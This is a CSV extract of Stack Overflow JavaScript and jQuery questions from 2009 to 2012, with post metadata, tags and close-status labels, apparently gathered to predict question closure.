PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
3638746,09/03/2010 18:59:41,132413,07/02/2009 17:38:01,508,34,Animated Sorting of Block Elements in Javascript,"I have a page where I want to animate the sorting of a list of block elements. 

    <div class=""container"">
        <div class=""content-block"">
        ....
        </div>
    
        <div class=""content-block"">
        ....
        </div>
    <div>

I want something similar to the sortable elements provided by jquery ui but it will animate based on an event not based on dragging. I can write it myself but I'm wondering if there are any good libraries out there to handle it.",javascript,jquery,jquery-ui,prototype,,,open,0,123,7,"Animated Sorting of Block Elements in Javascript I have a page where I want to animate the sorting of a list of block elements. 

    <div class=""container"">
        <div class=""content-block"">
        ....
        </div>
    
        <div class=""content-block"">
        ....
        </div>
    <div>

I want something similar to the sortable elements provided by jquery ui but it will animate based on an event not based on dragging. I can write it myself but I'm wondering if there are any good libraries out there to handle it.",4
7598671,09/29/2011 14:15:16,497060,11/04/2010 10:37:33,202,1,Scan a specific <div> and show the 3 most used words,"Here is my markup:

    <body>
      <div id=""headbox"">
        <p>Whatever...</p>
      </div>
        <div id=""feed"">
        <div>
        <p>I hate cats</p>
        </div>
        <div>
        <p>I like cats</p>
        </div>
        <div>
        <p>I like cats</p>
        </div>
        <div>
        <p>I like cats</p>
        </div>
      </div>
    </body>

The deal is I need a script that counts all words which appear in the < div id=""feed"" >..
The output should be wrapped in < p > tags or  < span > tags..

    <h3>The top 3 used words in this feed:</h3>
    1.&nbsp;<p>cats</p>&nbsp;4x
    2.&nbsp;<p>like</p>&nbsp;3x
    3.&nbsp;<p>hate</p>&nbsp;1x

This would be the output..

As you can see the word (or better the letter) ""I"" was not considered.. Every word under 3 letters will be no considert by the counting.",javascript,jquery,search,div,find,,open,0,237,11,"Scan a specific <div> and show the 3 most used words Here is my markup:

    <body>
      <div id=""headbox"">
        <p>Whatever...</p>
      </div>
        <div id=""feed"">
        <div>
        <p>I hate cats</p>
        </div>
        <div>
        <p>I like cats</p>
        </div>
        <div>
        <p>I like cats</p>
        </div>
        <div>
        <p>I like cats</p>
        </div>
      </div>
    </body>

The deal is I need a script that counts all words which appear in the < div id=""feed"" >..
The output should be wrapped in < p > tags or  < span > tags..

    <h3>The top 3 used words in this feed:</h3>
    1.&nbsp;<p>cats</p>&nbsp;4x
    2.&nbsp;<p>like</p>&nbsp;3x
    3.&nbsp;<p>hate</p>&nbsp;1x

This would be the output..

As you can see the word (or better the letter) ""I"" was not considered.. Every word under 3 letters will be no considert by the counting.",5
7767714,10/14/2011 12:39:20,831337,07/06/2011 10:10:41,3,2,Maintain Pinned website (in IE9 ),"Blog Post : [Using Site Pinning and Overlay Icons for Enhanced User Notifications][1] .
How i can do this using JQuery ?


  [1]: http://blog.reybango.com/2011/10/10/using-site-pinning-and-overlay-icons-for-enhanced-user-notifications-and-engagement/",javascript,jquery,internet-explorer,,,10/15/2011 17:38:09,not a real question,1,24,6,"Maintain Pinned website (in IE9 ) Blog Post : [Using Site Pinning and Overlay Icons for Enhanced User Notifications][1] .
How i can do this using JQuery ?


  [1]: http://blog.reybango.com/2011/10/10/using-site-pinning-and-overlay-icons-for-enhanced-user-notifications-and-engagement/",3
11367046,07/06/2012 17:31:28,1224106,02/21/2012 18:41:47,326,12,Javascript web app with mutiple pages in DOM,"I'm about to dive in head first to creating a Javascript web app. I'm not a Javascript novice, I know my way around, this is just a best practice question. I have done some research on the topic and just wanted to hear what SO had.

Background on the project: It is basically a management app, in which users have to type in a PIN, info is compared to a loaded var, then the user continues on to a specific page designated for their department. From there, there will be a tree of about five pages that they can stem out to; all dynamic.

My question is **What is the best practice for managing multiple pages within the DOM?**

Initially, my thoughts were to basically create an html tree, with a div for each department, then tree in the additional pages in that html tree, editing dynamic content with Javascript when required.

I have done some research and came across solutions like templating engines and using iframes. I want this to be a firmly structured and stable application, so I don't think screwing around iframes would be the best solution.",javascript,dom,,,,,open,0,186,8,"Javascript web app with mutiple pages in DOM I'm about to dive in head first to creating a Javascript web app. I'm not a Javascript novice, I know my way around, this is just a best practice question. I have done some research on the topic and just wanted to hear what SO had.

Background on the project: It is basically a management app, in which users have to type in a PIN, info is compared to a loaded var, then the user continues on to a specific page designated for their department. From there, there will be a tree of about five pages that they can stem out to; all dynamic.

My question is **What is the best practice for managing multiple pages within the DOM?**

Initially, my thoughts were to basically create an html tree, with a div for each department, then tree in the additional pages in that html tree, editing dynamic content with Javascript when required.

I have done some research and came across solutions like templating engines and using iframes. I want this to be a firmly structured and stable application, so I don't think screwing around iframes would be the best solution.",2
8983474,01/24/2012 07:42:25,6264,09/13/2008 12:34:05,4546,85,HTML5 + Javascript + JQuery course material,"For a ""university of applied science"" I am working with, we are looking to develop a course on HTML5 + Javascript + JQuery to develop a client side application. 

In another course given in the same period the students will develop a server side app which can persist data to a database. Probably this app has to provide a webservice which can be called by the client side application.

For the client side part we probably don't have any time to develop our own material. Is there any material on the web we can use as a course? Your hints are very welcome!",javascript,jquery,html5,education,training-courses,01/25/2012 13:09:28,not constructive,1,102,7,"HTML5 + Javascript + JQuery course material For a ""university of applied science"" I am working with, we are looking to develop a course on HTML5 + Javascript + JQuery to develop a client side application. 

In another course given in the same period the students will develop a server side app which can persist data to a database. Probably this app has to provide a webservice which can be called by the client side application.

For the client side part we probably don't have any time to develop our own material. Is there any material on the web we can use as a course? Your hints are very welcome!",5
11354644,07/06/2012 01:10:29,167911,09/03/2009 14:15:36,1655,15,Why doesn't the click handler work on this Raphael object?,"My current project is a heat map of the United States:

http://up.massrelevance.com/cnbc/top-states/heatmap.html

It's rendered with the help of Raphael and a couple of prepackaged libraries to generate the paths for the states. At some point in my code, I generate an array of references to the Raphael object representing each state; then I iterate over them, attaching a click handler to each (the actual Raphael object is stored in `projection.map`) using Raphael's `.click()` method:

    Heatmap.prototype.stateClick = function() {
      var projection, 
          state, 
          _this = this;
      for (state in this.projections) {
        projection = this.projections[state];
        console.log(state);
        console.log(projection.map[0]);
        (function(state, projection) {
          projection.map.click(function() {
            _this.overlay.update(state, _this.states[state]);
            _this.overlay.reveal();
          });
        })(state, projection);
      }
    };

This works fine for 48 of the 50 states. However, for some reason, Alaska (AK) and Oklahoma (OK) don't seem to get the click handler - that is, when I click them, nothing happens.

Watching the console for the output of the `console.log` calls in the code above, I can't see any differences between the Raphael objects for AK & OK from any other state's object, so I'm baffled as to what the cause may be.

Can anyone determine or guess what's happening, or maybe suggest how I might debug this further? Is there anything about how these shapes are drawn (e.g., maybe not with fully closed paths?) that may cause the click handler to fail to attach?

Thanks!",javascript,javascript-events,event-handling,svg,raphael,07/10/2012 13:37:02,too localized,1,336,10,"Why doesn't the click handler work on this Raphael object? My current project is a heat map of the United States:

http://up.massrelevance.com/cnbc/top-states/heatmap.html

It's rendered with the help of Raphael and a couple of prepackaged libraries to generate the paths for the states. At some point in my code, I generate an array of references to the Raphael object representing each state; then I iterate over them, attaching a click handler to each (the actual Raphael object is stored in `projection.map`) using Raphael's `.click()` method:

    Heatmap.prototype.stateClick = function() {
      var projection, 
          state, 
          _this = this;
      for (state in this.projections) {
        projection = this.projections[state];
        console.log(state);
        console.log(projection.map[0]);
        (function(state, projection) {
          projection.map.click(function() {
            _this.overlay.update(state, _this.states[state]);
            _this.overlay.reveal();
          });
        })(state, projection);
      }
    };

This works fine for 48 of the 50 states. However, for some reason, Alaska (AK) and Oklahoma (OK) don't seem to get the click handler - that is, when I click them, nothing happens.

Watching the console for the output of the `console.log` calls in the code above, I can't see any differences between the Raphael objects for AK & OK from any other state's object, so I'm baffled as to what the cause may be.

Can anyone determine or guess what's happening, or maybe suggest how I might debug this further? Is there anything about how these shapes are drawn (e.g., maybe not with fully closed paths?) that may cause the click handler to fail to attach?

Thanks!",5
8523481,12/15/2011 16:37:47,339500,05/12/2010 15:56:53,577,11,Warning in html pages run from CDROM,"A customer asked me to realize a web app using jquery to be run from html pages inside a CDROM as file:///index.html

When i launch the html page i always get security warnings from browser ... is there a way to avoid all those warnings that are annoying for the user?",javascript,jquery,html,,,12/15/2011 21:13:01,off topic,1,50,7,"Warning in html pages run from CDROM A customer asked me to realize a web app using jquery to be run from html pages inside a CDROM as file:///index.html

When i launch the html page i always get security warnings from browser ... is there a way to avoid all those warnings that are annoying for the user?",3
11049830,06/15/2012 11:27:38,632173,02/24/2011 11:01:56,94,5,tutorial/help for custom plugin for twitter-bootstrap,"Can anyone please suggest me a howto or any tutorial for developing custom plugins for twitter-bootstrap.

",javascript,jquery,twitter-bootstrap,,,06/16/2012 02:26:30,not a real question,1,16,6,"tutorial/help for custom plugin for twitter-bootstrap Can anyone please suggest me a howto or any tutorial for developing custom plugins for twitter-bootstrap.

",3
3445097,08/10/2010 00:08:39,400623,07/23/2010 19:54:56,15,1,Variable not being updated on button click? ,"I'm making a simple jQuery script that will allow you to change something on the click of a button. My problem is that if I change the value (checked), and then click the submit button, it will recognize it as the default. If you do this on the default, it is set to off, so if you check it off (turn on) and then click the submit button, it will be the default (off) command. I know this because I use local storage to save the settings. So if You check it off, refresh, and then click submit, it will do the proper action. 

Here's my jQuery:

    $(document).ready(function(){ 
    var test='false'

    if (localStorage.getItem('simpSet')){
	element = document.getElementById('simplify');
	var test=localStorage.getItem('simpSet');
	
	if(test == 'true'){
	element.setAttribute('checked');
	}
	
	console.log(test);
    }

    $('#simplify').live('click', function(){

    if ($('#simplify').is(':checked')){
    var test='true'
    console.log(test);

    }else{
    var test='false'
    console.log(test);
    }
    localStorage.setItem('simpSet', test);

    });

    $('#button').live('click', function(){
    console.log(test);

    if(test == 'true'){
    console.log('isTrue');
    $('#test').css('background', 'blue');
    return false;
    }else{
    $('#test').fadeOut('slow');
    return false;
    }

    });

    });

and my simple markup 

    <span id='simcont'>Simplify<input type='checkbox' id='simplify'></span>

    <input type=""submit"" val='Go' id='button'>
    <div id='test'>Testing simplifier</div>

Any ideas what's wrong? 

Example: http://kod.singaming.net/simplify/

By default the text will fade away, if you check it, it SHOULD turn the text's background blue. This doesn't work right however so it will just fade, but if you check it off, refresh and then submit it will turn the background blue. ",javascript,jquery,html5,local-storage,,,open,0,303,8,"Variable not being updated on button click?  I'm making a simple jQuery script that will allow you to change something on the click of a button. My problem is that if I change the value (checked), and then click the submit button, it will recognize it as the default. If you do this on the default, it is set to off, so if you check it off (turn on) and then click the submit button, it will be the default (off) command. I know this because I use local storage to save the settings. So if You check it off, refresh, and then click submit, it will do the proper action. 

Here's my jQuery:

    $(document).ready(function(){ 
    var test='false'

    if (localStorage.getItem('simpSet')){
	element = document.getElementById('simplify');
	var test=localStorage.getItem('simpSet');
	
	if(test == 'true'){
	element.setAttribute('checked');
	}
	
	console.log(test);
    }

    $('#simplify').live('click', function(){

    if ($('#simplify').is(':checked')){
    var test='true'
    console.log(test);

    }else{
    var test='false'
    console.log(test);
    }
    localStorage.setItem('simpSet', test);

    });

    $('#button').live('click', function(){
    console.log(test);

    if(test == 'true'){
    console.log('isTrue');
    $('#test').css('background', 'blue');
    return false;
    }else{
    $('#test').fadeOut('slow');
    return false;
    }

    });

    });

and my simple markup 

    <span id='simcont'>Simplify<input type='checkbox' id='simplify'></span>

    <input type=""submit"" val='Go' id='button'>
    <div id='test'>Testing simplifier</div>

Any ideas what's wrong? 

Example: http://kod.singaming.net/simplify/

By default the text will fade away, if you check it, it SHOULD turn the text's background blue. This doesn't work right however so it will just fade, but if you check it off, refresh and then submit it will turn the background blue. ",4
6528113,06/29/2011 22:42:02,198584,10/29/2009 01:37:52,33,1,Getting Facebook Page Posts,"I've written a bit of Javascript that will fetch all of the posts on a facebook Page. The URL with which I do that is this: 

http://graph.facebook.com/cocacola/feed?limit=5&callback=facebookResponse

and this worked fine and dandy, right up until last week sometime when I started seeing oauth errors.

I've searched for an hour or so on Stack and seen plenty of other people are trying to do this - but none have been asked after all of my requests to FB started returning these oauth errors. 

It really doesn't make sense - I'm trying to access publicly available data from company pages. I can still do so without oauth (albeit in a limited fashion) via RSS.

Anyhow, I'm hoping someone can clue me in as to how to get this PUBLICLY AVAILABLE information without having to go through the rigmarole of getting an application ID, an authorization token, etc.

Thanks
 - Chris",javascript,facebook,facebook-graph-api,,,,open,0,145,4,"Getting Facebook Page Posts I've written a bit of Javascript that will fetch all of the posts on a facebook Page. The URL with which I do that is this: 

http://graph.facebook.com/cocacola/feed?limit=5&callback=facebookResponse

and this worked fine and dandy, right up until last week sometime when I started seeing oauth errors.

I've searched for an hour or so on Stack and seen plenty of other people are trying to do this - but none have been asked after all of my requests to FB started returning these oauth errors. 

It really doesn't make sense - I'm trying to access publicly available data from company pages. I can still do so without oauth (albeit in a limited fashion) via RSS.

Anyhow, I'm hoping someone can clue me in as to how to get this PUBLICLY AVAILABLE information without having to go through the rigmarole of getting an application ID, an authorization token, etc.

Thanks
 - Chris",3
870797,05/15/2009 20:47:05,91232,04/15/2009 18:22:29,291,15,How is politico.com inserting a hyperlink into copied text?,"If you visit <a href=""http://www.politico.com/news/stories/0509/22574.html"">this article</a> on politico.com, highlight some of the article text, then paste that text elsewhere, it will contain a link that says ""Read more at: ..."".  How is this done?",javascript,,,,,,open,0,35,9,"How is politico.com inserting a hyperlink into copied text? If you visit <a href=""http://www.politico.com/news/stories/0509/22574.html"">this article</a> on politico.com, highlight some of the article text, then paste that text elsewhere, it will contain a link that says ""Read more at: ..."".  How is this done?",1
8119740,11/14/2011 09:47:16,150254,08/04/2009 10:28:32,539,3,How do I get the codes of creating the sidebar from this website?,"After I save the page to my machine, the sidebar is not working anymore.
I checked the links to the css n js files, they are directed to the folder saved in my machine. So what is the reason?
http://www.uize.com/search-sections.html

If somehow I am not able to get the codes for the sidebar, how do I create a similar sidebar? Thanks.",javascript,html,css,,,11/14/2011 10:50:30,not a real question,1,58,13,"How do I get the codes of creating the sidebar from this website? After I save the page to my machine, the sidebar is not working anymore.
I checked the links to the css n js files, they are directed to the folder saved in my machine. So what is the reason?
http://www.uize.com/search-sections.html

If somehow I am not able to get the codes for the sidebar, how do I create a similar sidebar? Thanks.",3
9326398,02/17/2012 10:15:18,1215938,02/17/2012 10:07:27,1,0,Models in Javacript Frameworks,"I started creating a web service in Ruby on Rails. After some time I discovered some amazing javascript frameworks:
-Backbone
-KnockoutJs
-SproutCore
-BatmanJs
-etc..

Does that JS frameworks saves user informations in database (Model?) and are they good solution for creating web application intended to users?",javascript,backbone.js,knockout.js,sproutcore,,,open,0,40,4,"Models in Javacript Frameworks I started creating a web service in Ruby on Rails. After some time I discovered some amazing javascript frameworks:
-Backbone
-KnockoutJs
-SproutCore
-BatmanJs
-etc..

Does that JS frameworks saves user informations in database (Model?) and are they good solution for creating web application intended to users?",4
6550898,07/01/2011 16:51:16,406762,07/30/2010 13:35:07,174,0,Learning Javascript and would love some direction/help/advice,"Im currently trying to get my head round the ins and outs of javascript, up to this point Ive learnt the fundamentals such as variables, loops, functions, loops, arrays etc but everything has been coming out of the book Im working on 'Head First Javascript' what I would like to do is create a mini-project that will help me tie what Ive learnt so far together but Im not sure what would be good to try and create, does anyone have any mini-project ideas that would help get me moving with actually writing loads of (very rough) Javascript code?

p.s im focusing on pure javascript learning and with no frameworks.

Thanks
Kyle",javascript,,,,,07/01/2011 19:23:20,not constructive,1,109,7,"Learning Javascript and would love some direction/help/advice Im currently trying to get my head round the ins and outs of javascript, up to this point Ive learnt the fundamentals such as variables, loops, functions, loops, arrays etc but everything has been coming out of the book Im working on 'Head First Javascript' what I would like to do is create a mini-project that will help me tie what Ive learnt so far together but Im not sure what would be good to try and create, does anyone have any mini-project ideas that would help get me moving with actually writing loads of (very rough) Javascript code?

p.s im focusing on pure javascript learning and with no frameworks.

Thanks
Kyle",1
2897619,05/24/2010 14:16:34,25968,10/07/2008 21:51:27,2266,73,Using Javascript to generate and save a file,"I've been fiddling with WebGL lately, and have gotten a Collada reader working. Problem is it's pretty slow (Collada is a very verbose format), so I'm going to start converting files to a easier to use format (probably JSON). Thing is, I already have the code to parse the file in Javascript, so I may as well use it as my exporter too! The problem is saving.

Now, I know that I can parse the file, send the result to the server, and have the browser request the file back from the server as a download. But in reality the server has nothing to do with this particular process, so why get it involved? I already have the contents of the desired file in memory. Is there any way that I could present the user with a download using pure javascript? (I doubt it, but might as well ask...)

And to be clear: I am not trying to access the filesystem without the users knowledge! The user will provide a file (probably via drag and drop), the script will transform the file in memory, and the user will be prompted to download the result. All of which should be ""safe"" activities as far as the browser is concerned.",javascript,download,,,,,open,0,206,8,"Using Javascript to generate and save a file I've been fiddling with WebGL lately, and have gotten a Collada reader working. Problem is it's pretty slow (Collada is a very verbose format), so I'm going to start converting files to a easier to use format (probably JSON). Thing is, I already have the code to parse the file in Javascript, so I may as well use it as my exporter too! The problem is saving.

Now, I know that I can parse the file, send the result to the server, and have the browser request the file back from the server as a download. But in reality the server has nothing to do with this particular process, so why get it involved? I already have the contents of the desired file in memory. Is there any way that I could present the user with a download using pure javascript? (I doubt it, but might as well ask...)

And to be clear: I am not trying to access the filesystem without the users knowledge! The user will provide a file (probably via drag and drop), the script will transform the file in memory, and the user will be prompted to download the result. All of which should be ""safe"" activities as far as the browser is concerned.",2
7774092,10/14/2011 22:07:15,454264,09/21/2010 17:46:24,73,0,Using javascript var in jQuery .html,"Very simple question:

Is it possible to display a var in .html, using jQuery?

    
    var inscr = '<?php echo ""test""; ?>';
        $j('#myPlaceHolder7').html('<li class=""button3"">+inscr</li>');

Thanks!",javascript,jquery,,,,,open,0,36,6,"Using javascript var in jQuery .html Very simple question:

Is it possible to display a var in .html, using jQuery?

    
    var inscr = '<?php echo ""test""; ?>';
        $j('#myPlaceHolder7').html('<li class=""button3"">+inscr</li>');

Thanks!",2
7256608,08/31/2011 11:58:45,291772,03/11/2010 18:38:45,1742,34,getSelection without title attribute?,"Im using window.getSelection (); to get the selected text.
But, if i select an image to, it returns also title of an image.

EXAMPLE:

    <img src=""someSrc.jpg"" title=""image_title"" /> My text here ... 

if i select all an image too, it returns 

> image_title My text here ...

 But i need only 

> My text here ...

Is there any way to get only text, without title?

Thanks much .",javascript,getselection,,,,,open,0,68,4,"getSelection without title attribute? Im using window.getSelection (); to get the selected text.
But, if i select an image to, it returns also title of an image.

EXAMPLE:

    <img src=""someSrc.jpg"" title=""image_title"" /> My text here ... 

if i select all an image too, it returns 

> image_title My text here ...

 But i need only 

> My text here ...

Is there any way to get only text, without title?

Thanks much .",2
6405890,06/20/2011 00:18:01,805846,06/20/2011 00:18:01,1,0,Set body left margin using Javascript,"**Setting the body elements left margin using javascript does not work, it doesn't move?**

I dont know why this doesn't work? If I set the left margin using CSS it works but not when I do it in javascript, why?

    <html>
    <head>
        <style type=""text/css"">
            <!-- 
                body { margin-left: 0px; } /* set margin to anything so I can change it in JS*/
            -->
    </head>
    <body>
    
        <div id=""test""  style=""background-color: blue;""> blah </div>

        <script type=""text/javascript"">
	<!--
		var APP_WIDTH = 555;
		var scrWidth  = 760; //getScreenSize()[""width""];
		var xOffset   = Math.abs( Math.floor( (scrWidth/2)-(APP_WIDTH/2) ) );
		document.getElementsByTagName(""body"")[0].style.margin.left = xOffset + ""px"";  // doesn't move the div inside body?
		alert( xOffset + ""px"" );
		-->
	</script>
    </body>
    </html>",javascript,html,css,,,,open,0,189,6,"Set body left margin using Javascript **Setting the body elements left margin using javascript does not work, it doesn't move?**

I dont know why this doesn't work? If I set the left margin using CSS it works but not when I do it in javascript, why?

    <html>
    <head>
        <style type=""text/css"">
            <!-- 
                body { margin-left: 0px; } /* set margin to anything so I can change it in JS*/
            -->
    </head>
    <body>
    
        <div id=""test""  style=""background-color: blue;""> blah </div>

        <script type=""text/javascript"">
	<!--
		var APP_WIDTH = 555;
		var scrWidth  = 760; //getScreenSize()[""width""];
		var xOffset   = Math.abs( Math.floor( (scrWidth/2)-(APP_WIDTH/2) ) );
		document.getElementsByTagName(""body"")[0].style.margin.left = xOffset + ""px"";  // doesn't move the div inside body?
		alert( xOffset + ""px"" );
		-->
	</script>
    </body>
    </html>",3
11306190,07/03/2012 07:18:37,1497992,07/03/2012 07:14:17,1,0,Blank Page while using dialogs,"We are facing 2 issues
1) The dialog boxes opened using FB.Ui method. Clicking on cancel is not closing the overlay or popup but turns blank. Is this an open issue?
2) Using FB.getLoginStatus method on click still throws the popup blocker on IE. Can someone please confirm if they are also facing the same issues.

Thank you,
N G.",javascript,facebook-javascript-sdk,,,,07/08/2012 23:14:03,not a real question,1,56,5,"Blank Page while using dialogs We are facing 2 issues
1) The dialog boxes opened using FB.Ui method. Clicking on cancel is not closing the overlay or popup but turns blank. Is this an open issue?
2) Using FB.getLoginStatus method on click still throws the popup blocker on IE. Can someone please confirm if they are also facing the same issues.

Thank you,
N G.",2
9644124,03/10/2012 05:15:57,1138240,01/09/2012 08:16:58,6,0,How to make this work on click...? Is it possible,"<p onclick=""javascript:window.open('http://mail.google', 'gmail', 'height=550, width=800,toolbar=no, directories=no, status=no, menubar=no,scrollbars=yes,resizable=yes,left=200, top=250');manoj();"">click here</p>


I want to open two pop-up on single click... It is getting blocked in IE.. 

Please help",javascript,block,pop-up,,,03/10/2012 15:02:46,too localized,1,26,10,"How to make this work on click...? Is it possible <p onclick=""javascript:window.open('http://mail.google', 'gmail', 'height=550, width=800,toolbar=no, directories=no, status=no, menubar=no,scrollbars=yes,resizable=yes,left=200, top=250');manoj();"">click here</p>


I want to open two pop-up on single click... It is getting blocked in IE.. 

Please help",3
9981890,04/02/2012 18:36:32,1214032,02/16/2012 14:19:29,18,0,Need Javascript help for Website,"I have made this webpage, you can check it out here http://www.bettingtowin.net/webcam.html

I have inserted buttons but they are useless at the moment and need your help.

What I need is for the small robot picture to change to another picture according to the button that was pressed.

So when I click ""Right Arm"" button for e.g. I want the picture associated with that button to load instead of smallrobot.jpg

So basically a really basic javascript code. By the way I am no longer a student so its ok to show me the code ;) Thanks in advanced",javascript,html,,,,04/02/2012 20:24:57,not a real question,1,94,5,"Need Javascript help for Website I have made this webpage, you can check it out here http://www.bettingtowin.net/webcam.html

I have inserted buttons but they are useless at the moment and need your help.

What I need is for the small robot picture to change to another picture according to the button that was pressed.

So when I click ""Right Arm"" button for e.g. I want the picture associated with that button to load instead of smallrobot.jpg

So basically a really basic javascript code. By the way I am no longer a student so its ok to show me the code ;) Thanks in advanced",2
3868493,10/05/2010 23:20:31,428137,08/23/2010 07:25:49,410,7,jquery problem?,"i have this jquery file, but the `vote_up click handler` keeps conflicting with the `vote_down click handler`, when i click the vote_down element it changes the vote_up element:

jquery script:

    $(document).ready( function() {
      $(""a.vote_up"").click(function(){
        //get the id
     var the_id =  this.id.split('_').pop();
    
        //the main ajax request
        $.ajax( {
          type: ""POST"",
          data: ""action=vote_up&id="" + the_id,
          url: ""ajax/votes.php"",
          success: function( msg ) {
            $(""span.vote_count#""+the_id).html(msg).fadeIn();
           $(""#"" + the_id + "" img"").attr(""src"", ""img/uparrowActive.png"");
    
    
          }
        } );
      } );
    
    } );
    
    
    	
    $(document).ready( function() {
    	// the vote down function
    	$(""a.vote_down"").click(function(){
    	//get the id
    	var vote_id =  this.id.split('_').pop();
    
    
    
    	//the main ajax request
    	$.ajax({
    		type: ""POST"",
    		data: ""action=vote_down&id="" + vote_id,
    			url: ""ajax/votes.php"",
    			success: function(msg)
    			{
    			 $(""span.vote_count#""+vote_id).html(msg).fadeIn();
                             $(""#"" + vote_id + "" img"").attr(""src"", ""img/downarrowActive.png"");
    
    			}
    		});
    	});
    
    });

html: 

     
    <a href='#' class='vote_up' id=""id_23""><img src=""img/uparrow.png"" /></a>
    <a href='#' class='vote_down' id=""id_23""><img src=""img/downarrow.png"" /></a>

the jquery and ajax request is wokring fine, but the change of src is the problem, because when i click vote down, it changes the vote_up image!!",javascript,jquery,html,image,,,open,0,412,2,"jquery problem? i have this jquery file, but the `vote_up click handler` keeps conflicting with the `vote_down click handler`, when i click the vote_down element it changes the vote_up element:

jquery script:

    $(document).ready( function() {
      $(""a.vote_up"").click(function(){
        //get the id
     var the_id =  this.id.split('_').pop();
    
        //the main ajax request
        $.ajax( {
          type: ""POST"",
          data: ""action=vote_up&id="" + the_id,
          url: ""ajax/votes.php"",
          success: function( msg ) {
            $(""span.vote_count#""+the_id).html(msg).fadeIn();
           $(""#"" + the_id + "" img"").attr(""src"", ""img/uparrowActive.png"");
    
    
          }
        } );
      } );
    
    } );
    
    
    	
    $(document).ready( function() {
    	// the vote down function
    	$(""a.vote_down"").click(function(){
    	//get the id
    	var vote_id =  this.id.split('_').pop();
    
    
    
    	//the main ajax request
    	$.ajax({
    		type: ""POST"",
    		data: ""action=vote_down&id="" + vote_id,
    			url: ""ajax/votes.php"",
    			success: function(msg)
    			{
    			 $(""span.vote_count#""+vote_id).html(msg).fadeIn();
                             $(""#"" + vote_id + "" img"").attr(""src"", ""img/downarrowActive.png"");
    
    			}
    		});
    	});
    
    });

html: 

     
    <a href='#' class='vote_up' id=""id_23""><img src=""img/uparrow.png"" /></a>
    <a href='#' class='vote_down' id=""id_23""><img src=""img/downarrow.png"" /></a>

the jquery and ajax request is wokring fine, but the change of src is the problem, because when i click vote down, it changes the vote_up image!!",4
9746795,03/17/2012 02:41:47,1055664,11/19/2011 19:54:37,3,0,Would you use JS MVC framework when using Phonegap and JQuery mobile?,"I am using JQuery mobile to build a iOS Application using Phonegap 1.5. Since there are some components like header whiter are used on many views I wonder if I should use a template framework in JavaScript or not? 

Does this slow my application down? And which one does work best with PHonegap and JQuery mobile?",javascript,frameworks,jquery-mobile,phonegap,,,open,0,56,12,"Would you use JS MVC framework when using Phonegap and JQuery mobile? I am using JQuery mobile to build a iOS Application using Phonegap 1.5. Since there are some components like header whiter are used on many views I wonder if I should use a template framework in JavaScript or not? 

Does this slow my application down? And which one does work best with PHonegap and JQuery mobile?",4
11551882,07/18/2012 23:30:45,1429914,06/01/2012 05:08:48,1,0,Google Play App UI in javascript?,"I would like to copy the Google Play App layout for my own web app (in javascript/jquery). Does anyone have an example of this?

the horizontal scrolling with two panels (title bar and body)
how they make the tile (grid) layout in the main page.

You can see a demo here: http://www.webitap.com/saba/Google_Play_UI/GooglePlayUI.MOV",javascript,android,jquery,swipe,swipe-gesture,07/19/2012 03:05:10,too localized,1,49,6,"Google Play App UI in javascript? I would like to copy the Google Play App layout for my own web app (in javascript/jquery). Does anyone have an example of this?

the horizontal scrolling with two panels (title bar and body)
how they make the tile (grid) layout in the main page.

You can see a demo here: http://www.webitap.com/saba/Google_Play_UI/GooglePlayUI.MOV",5
